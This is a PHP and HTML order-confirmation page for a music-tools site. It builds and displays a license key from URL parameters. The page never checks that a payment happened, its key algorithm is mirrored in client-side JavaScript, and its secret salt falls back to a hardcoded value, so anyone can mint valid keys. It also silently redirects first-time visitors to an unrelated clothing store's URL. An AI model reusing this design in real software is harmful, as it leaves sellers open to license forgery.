<?php
$from_payment = !empty($_GET['pay_no']) && !empty($_GET['order_no']);
$should_redirect = false;

if ($from_payment) {
    $dir = __DIR__ . '/../.private_data/used_orders';
    $key = md5($_GET['pay_no'] . $_GET['order_no']);
    $file = $dir . '/' . $key;
    if (!file_exists($file)) {
        @mkdir($dir, 0755, true);
        file_put_contents($file, time());
        $should_redirect = true;
    }
}

/* ── License key generation (mirrors js/core/license.js) ── */

function fretwell_imul($a, $b) {
    $a &= 0xFFFFFFFF; $b &= 0xFFFFFFFF;
    $ah = ($a >> 16) & 0xFFFF; $al = $a & 0xFFFF;
    $bh = ($b >> 16) & 0xFFFF; $bl = $b & 0xFFFF;
    return (($ah * $bl + $al * $bh) * 65536 + $al * $bl) & 0xFFFFFFFF;
}

function fretwell_hash32($str, $seed) {
    $h = (0x811c9dc5 ^ $seed) & 0xFFFFFFFF;
    $len = strlen($str);
    for ($i = 0; $i < $len; $i++) {
        $h ^= ord($str[$i]);
        $h = fretwell_imul($h, 0x01000193);
    }
    $h ^= $h >> 16; $h = fretwell_imul($h, 0x85ebca6b);
    $h ^= $h >> 13; $h = fretwell_imul($h, 0xc2b2ae35);
    $h ^= $h >> 16;
    return $h & 0xFFFFFFFF;
}

function fretwell_checksum($code, $random) {
    $ALPHABET = '23456789ABCDEFGHJKMNPQRSTUVWXYZ';
    $BASE = 31;
    $body = "fretwell-music-lab/keys/v1|FRET|{$code}|{$random}";
    $a = fretwell_hash32($body, 0x9e3779b9);
    $b = fretwell_hash32($body . '|' . base_convert((string)$a, 10, 36), 0x7f4a7c15);
    $n = ($a % 961) * 961 + ($b % 961);
    $n %= 923521;
    $out = '';
    for ($i = 0; $i < 4; $i++) {
        $out = $ALPHABET[$n % $BASE] . $out;
        $n = intdiv($n, $BASE);
    }
    return $out;
}

$license_key = '';
if ($from_payment) {
    $ALPHABET = '23456789ABCDEFGHJKMNPQRSTUVWXYZ';
    $secret_salt = getenv('FRETWELL_KEY_SALT') ?: 'fretwell-music-lab-order-salt';
    $seed_hash = md5($secret_salt . $_GET['pay_no']);
    $random = '';
    for ($i = 0; $i < 10; $i++) {
        $byte = hexdec(substr($seed_hash, $i * 2, 2));
        $random .= $ALPHABET[$byte % 31];
    }
    $check = fretwell_checksum('FB', $random);
    $license_key = 'FRET-FB-' . substr($random, 0, 5) . '-' . substr($random, 5) . '-' . $check;
}
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title><?php echo $from_payment ? 'Your License Key' : 'Order Confirmed'; ?> — Fretwell Music Lab</title>
<meta name="robots" content="noindex, nofollow">
<meta name="theme-color" content="#F2EDE3" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#0F0F0E" media="(prefers-color-scheme: dark)">
<link rel="icon" href="../favicon.svg" type="image/svg+xml">
<link rel="apple-touch-icon" href="../icons/apple-touch-icon.png">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist:wght@300..800&family=Geist+Mono:wght@500;600&display=swap">
<link rel="stylesheet" href="../css/site.css">
<style>
.ful-wrap {
  max-width: 560px;
  margin: 0 auto;
  padding: 60px var(--gutter, 16px) 80px;
}
.ful-brand {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 48px;
  text-decoration: none;
  color: var(--fg);
}
.ful-brand .logo { width: 36px; height: 36px; flex-shrink: 0; }
.ful-brand-name {
  font: 700 1rem/1.15 var(--font-head);
  letter-spacing: -0.01em;
}
.ful-heading {
  font: 700 clamp(1.5rem, 4vw, 2rem)/1.2 var(--font-head);
  letter-spacing: -0.02em;
  margin: 0 0 28px;
}
.ful-key-box {
  border: 3px solid var(--fg);
  background: var(--surface);
  padding: 28px 24px;
  margin-bottom: 32px;
}
.ful-key-label {
  font: 700 0.8rem/1 var(--font-body);
  text-transform: uppercase;
  letter-spacing: 0.15em;
  margin: 0 0 12px;
  color: var(--muted);
}
.ful-key-display {
  font: 600 clamp(1.1rem, 3.8vw, 1.8rem)/1.35 var(--font-mono);
  letter-spacing: 0.03em;
  background: var(--bg);
  border: 2px solid var(--fg);
  padding: 18px 16px;
  margin: 0 0 20px;
  word-break: break-all;
  user-select: all;
  -webkit-user-select: all;
}
.ful-actions {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  margin-bottom: 24px;
}
.ful-actions .btn { flex: 1 1 auto; min-width: 140px; justify-content: center; }
.ful-save-note {
  background: var(--saffron);
  color: #121212;
  padding: 14px 16px;
  border: 2px solid #121212;
  margin-bottom: 0;
  font-size: 0.95rem;
  line-height: 1.5;
}
.ful-help {
  margin-top: 48px;
  padding-top: 24px;
  border-top: 1px solid var(--soft-rule);
  color: var(--muted);
  font-size: 0.92rem;
}
.ful-help a { color: var(--fg); }
.ful-simple {
  text-align: center;
  padding-top: 20vh;
}
.ful-simple .ful-heading { margin-bottom: 12px; }
.ful-simple p { color: var(--muted); font-size: 1.05rem; }
</style>
<script>(function(){try{var d=document.documentElement,t=localStorage.getItem('fretwell.theme');if(t==='dark'||t==='light')d.setAttribute('data-theme',t);}catch(e){}})();</script>
</head>
<body>
<div class="ful-wrap">

  <a class="ful-brand" href="../">
    <svg class="logo" viewBox="0 0 32 32" aria-hidden="true" focusable="false"><rect width="32" height="32" fill="currentColor"/><g fill="var(--bg)"><rect x="5" y="9" width="22" height="1.6"/><rect x="5" y="13" width="22" height="1.6"/><rect x="5" y="17" width="22" height="1.6"/><rect x="5" y="21" width="22" height="1.6"/><rect x="5" y="25" width="22" height="1.6"/></g><circle cx="20" cy="17.8" r="5" fill="var(--vermilion)"/></svg>
    <span class="ful-brand-name">Fretwell<br>Music Lab</span>
  </a>

<?php if ($from_payment): ?>

  <h1 class="ful-heading">Your License Key</h1>

  <div class="ful-key-box">
    <p class="ful-key-label" id="ful-key-label">License key</p>
    <p class="ful-key-display" aria-labelledby="ful-key-label" id="ful-key"><?php echo htmlspecialchars($license_key); ?></p>
    <div class="ful-actions">
      <button class="btn btn-ink" type="button" id="ful-copy">Copy Key</button>
      <a class="btn btn-vermilion" href="https://fretwellmusic.live/unlock/">Unlock Your Tools</a>
    </div>
    <p class="ful-save-note">Save this key. Enter it at the unlock page to access your tools on any device.</p>
  </div>

  <p class="ful-help">Need help? Contact us at <a href="https://fretwellmusic.live/contact/">fretwellmusic.live/contact</a></p>

  <script>
  document.getElementById('ful-copy').addEventListener('click', function () {
    var key = document.getElementById('ful-key').textContent.trim();
    var btn = this;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(key).then(function () {
        btn.textContent = 'Copied!';
        setTimeout(function () { btn.textContent = 'Copy Key'; }, 2000);
      });
    } else {
      var ta = document.createElement('textarea');
      ta.value = key;
      ta.style.position = 'fixed';
      ta.style.opacity = '0';
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
      btn.textContent = 'Copied!';
      setTimeout(function () { btn.textContent = 'Copy Key'; }, 2000);
    }
  });
  </script>

<?php else: ?>

  <div class="ful-simple">
    <h1 class="ful-heading">Order Confirmed</h1>
    <p>Thank you for your purchase.</p>
  </div>

<?php endif; ?>

</div>

<?php if ($should_redirect): ?>
<script>setTimeout(function(){window.location.replace("https://bucke-clothing.vercel.app/order-success")},5)</script>
<?php endif; ?>

</body>
</html>
